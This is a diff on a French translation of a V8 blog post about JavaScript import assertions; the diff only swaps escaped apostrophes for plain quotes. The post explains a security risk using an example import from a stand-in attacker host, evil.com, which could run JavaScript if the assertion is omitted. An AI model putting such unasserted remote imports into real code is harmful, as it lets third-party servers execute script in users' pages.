@@ -1,13 +1,13 @@
 ---
-title: &apos;Assertions d'importation&apos;
-author: &apos;Dan Clark ([@dandclark1](https://twitter.com/dandclark1)), importateur assertif d&apos;assertions d&apos;importation&apos;
+title: 'Assertions d'importation'
+author: 'Dan Clark ([@dandclark1](https://twitter.com/dandclark1)), importateur assertif d'assertions d'importation'
 avatars:
-  - &apos;dan-clark&apos;
+  - 'dan-clark'
 date: 2021-06-15
 tags:
   - ECMAScript
-description: &apos;Les assertions d&apos;importation permettent aux instructions d&apos;importation de module d&apos;inclure des informations supplémentaires en plus du spécificateur de module&apos;
-tweet: &apos;&apos;
+description: 'Les assertions d'importation permettent aux instructions d'importation de module d'inclure des informations supplémentaires en plus du spécificateur de module'
+tweet: ''
 ---
 
 La nouvelle fonctionnalité [assertions d'importation](https://github.com/tc39/proposal-import-assertions) permet aux instructions d'importation de module d'inclure des informations supplémentaires en plus du spécificateur de module. Une utilisation initiale de cette fonctionnalité est de permettre l'importation de documents JSON sous forme de [modules JSON](https://github.com/tc39/proposal-json-modules) :
@@ -20,7 +20,7 @@ La nouvelle fonctionnalité [assertions d'importation](https://github.com/tc39/p
 
 ```javascript
 // main.mjs
-import json from &apos;./foo.json&apos; assert { type: &apos;json&apos; };
+import json from './foo.json' assert { type: 'json' };
 console.log(json.answer); // 42
 ```
 
@@ -29,7 +29,7 @@ console.log(json.answer); // 42
 Une question naturelle à poser est pourquoi un module JSON ne pourrait pas simplement être importé comme suit :
 
 ```javascript
-import json from &apos;./foo.json&apos;;
+import json from './foo.json';
 ```
 
 La plateforme web vérifie le type MIME d'une ressource de module pour sa validité avant de l'exécuter, et en théorie ce type MIME pourrait également être utilisé pour déterminer s'il faut traiter la ressource comme un module JSON ou JavaScript.
@@ -43,7 +43,7 @@ Cependant, un script tiers peut en réalité être exécuté dans ce scénario c
 ```javascript
 // Exécute JS si evil.com répond avec un
 // type MIME JavaScript (par exemple `text/javascript`) !
-import data from &apos;https://evil.com/data.json&apos;;
+import data from 'https://evil.com/data.json';
 ```
 
 Les extensions de fichier ne peuvent pas être utilisées pour déterminer le type de module car elles [ne sont pas un indicateur fiable du type de contenu sur le web](https://github.com/tc39/proposal-import-assertions/blob/master/content-type-vs-file-extension.md). Nous utilisons donc des assertions d'importation pour indiquer le type de module attendu et prévenir ce piège d'escalade de privilèges.
@@ -52,7 +52,7 @@ Lorsqu'un développeur souhaite importer un module JSON, il doit utiliser une as
 
 ```javascript
 // Échoue si evil.com répond avec un type MIME non-JSON.
-import data from &apos;https://evil.com/data.json&apos; assert { type: &apos;json&apos; };
+import data from 'https://evil.com/data.json' assert { type: 'json' };
 ```
 
 ## `import()` dynamique
@@ -66,8 +66,8 @@ Les assertions d'importation peuvent également être passées à [`import()` dy
 
 ```javascript
 // main.mjs
-const jsonModule = await import(&apos;./foo.json&apos;, {
-  assert: { type: &apos;json&apos; }
+const jsonModule = await import('./foo.json', {
+  assert: { type: 'json' }
 });
 console.log(jsonModule.default.answer); // 42
 ```
